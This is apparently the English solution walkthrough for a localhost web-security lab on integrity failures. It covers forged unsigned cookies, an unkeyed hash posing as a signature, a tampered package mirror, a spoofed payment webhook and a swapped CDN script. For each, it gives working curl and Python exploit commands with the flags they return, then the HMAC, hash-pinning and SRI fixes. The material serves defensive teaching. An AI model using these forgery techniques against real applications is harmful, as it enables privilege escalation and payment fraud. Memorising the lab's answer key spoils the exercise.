🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A08 — Solution walkthrough (spoilers)

Examples: `curl` against `http://127.0.0.1:8071` (vulnerable) and short Python one-liners for encoding data. On Windows, Git Bash or WSL is more convenient.

## Defect 1 — user state in a cookie without a signature

After login the server issues the `a08v_profile` cookie — it is simply `base64url({"user":"alice","role":"user"})`. On every request the server reads the role from it.

```bash
FORGED=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'user':'alice','role':'admin'}).encode()).decode().rstrip('='))")
curl -s -b "a08v_profile=$FORGED" http://127.0.0.1:8071/admin
# {"flag": "FLAG{a08_unsigned_profile_cookie}", "ok": true}
```

**Rule:** anything stored on the client can be changed by the client. Keep trusted state on the server or sign it.

**Fix:** the cookie is signed with HMAC-SHA256 using the server's secret, and the role is not taken from the token at all — it is read from server-side storage (`# FIX 1`).

> About deserialization: in real applications the same thing happens with `pickle`, Java serialization, PHP `unserialize()` and the like — there, swapping the data can lead to code execution. Such exploits are deliberately not included in the lab: swapping the data is enough for the lesson. The rule is the same — do not deserialize untrusted data, and use simple formats (JSON) together with a signature.

## Defect 2 — a "signature" without a secret key

The `a08v_license` cookie = `base64url(json).sha256hex(json)`. It sounds like a signature, but SHA-256 is just a hash: anyone can compute it.

```bash
curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
PROFILE=$(grep a08v_profile j.txt | awk '{print $7}')
FORGED=$(python3 - <<'PY'
import base64, hashlib, json
data = json.dumps({"user":"alice","plan":"pro"}, separators=(",",":")).encode()
print(base64.urlsafe_b64encode(data).decode().rstrip("=") + "." + hashlib.sha256(data).hexdigest())
PY
)
curl -s -b "a08v_profile=$PROFILE; a08v_license=$FORGED" http://127.0.0.1:8071/pro
# {"flag": "FLAG{a08_unkeyed_hash_is_not_a_signature}", "ok": true}
```

**Rule:** a hash protects against accidental corruption, but not against an attacker. Against an attacker you need a MAC with a secret (HMAC) or a digital signature.

**Fix:** `hmac.new(SECRET, data, sha256)` + `hmac.compare_digest`; the license is bound to the user (`# FIX 2`).

## Defect 3 — an update without an integrity check

The mirror is "hacked" — the attacker has published an extra field `payout_account` in the `theme-pack` package:

```bash
curl -s -X POST http://127.0.0.1:8071/mirror/publish -H 'Content-Type: application/json' \
  -d '{"package":"theme-pack","version":"1.2","content":{"theme":"dark","payout_account":"ATTACKER-IBAN-6666"}}'
curl -s -X POST http://127.0.0.1:8071/system/run-update
curl -s http://127.0.0.1:8071/settings
# payout_account has changed; the response contains the flag FLAG{a08_update_without_integrity_check}
```

This is exactly how supply chain attacks work: trust in the source ("it is our mirror") instead of checking the content.

**Fix** (`# FIX 3`): a "lock file" with a pinned hash of every package, comparison with `compare_digest`, refusal for a package that is not in the lock file, plus an allow list of the fields that a package may change at all. The same principle in the real world: `package-lock.json` with `integrity`, `pip install --require-hashes`, artifact signing (Sigstore/cosign), pinned Docker image digests.

## Defect 4 — a webhook without a signature

```bash
curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
curl -s -X POST http://127.0.0.1:8071/webhook/payment -H 'Content-Type: application/json' \
  -d '{"order_id":1001,"status":"paid","amount":5000}'
curl -s -b j.txt http://127.0.0.1:8071/orders/1001
# status: paid, download_key: FLAG{a08_unsigned_webhook}
```

**Fix** (`# FIX 4`): the provider signs `timestamp.body` with a shared secret (`X-Signature: sha256=...`, `X-Timestamp`). The server checks the signature, the freshness of the timestamp (±5 minutes), that this signature has not been used before (replay), and that the amount and the order state match.

What a correct request to fixed looks like (this is what a real provider that knows the secret does):

```python
import hashlib, hmac, json, time, requests
secret = b"lab-demo-webhook-secret"
body = json.dumps({"order_id": 1001, "status": "paid", "amount": 5000}).encode()
ts = str(int(time.time()))
sig = "sha256=" + hmac.new(secret, ts.encode() + b"." + body, hashlib.sha256).hexdigest()
r = requests.post("http://127.0.0.1:8072/webhook/payment", data=body,
                  headers={"X-Timestamp": ts, "X-Signature": sig, "Content-Type": "application/json"})
print(r.status_code, r.text)   # 200; repeating the same request -> 409; a changed body -> 401
```

The attacker does not know the secret, so without it they cannot make a valid signature.

## Defect 5 — a third-party script without SRI

1. Open `http://127.0.0.1:8071/donate`: you see the legitimate payment details `LAB-IBAN-0001-LEGIT`.
2. Run `curl -X POST http://127.0.0.1:8071/cdn/compromise` and refresh the page: now it shows `ATTACKER-IBAN-6666`. The page did not change, but the script it loads did.

**Fix** (`# FIX 5`, the page `http://127.0.0.1:8072/donate`):

```html
<script src="/cdn/widget.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

The browser compares the hash of the received file with `integrity` and simply does not run the script if they do not match. Repeat the steps on 8072: after `POST /cdn/compromise` the payment details stay as "загрузка…" (loading…), and an integrity check error appears in the browser console. SRI protects against a file being swapped on the CDN, but not against a malicious version that you pinned yourself — which is why the hashes are taken from a verified build.

## Summary
What all five defects have in common: the server or the browser **trusts data by its origin** ("it is our cookie / our mirror / our payment provider / our CDN") instead of **verifying its authenticity**. The fix is the same in meaning everywhere: a signature or a pinned hash, a secret that the attacker does not have, a freshness check and a limit on what even trusted data may change.
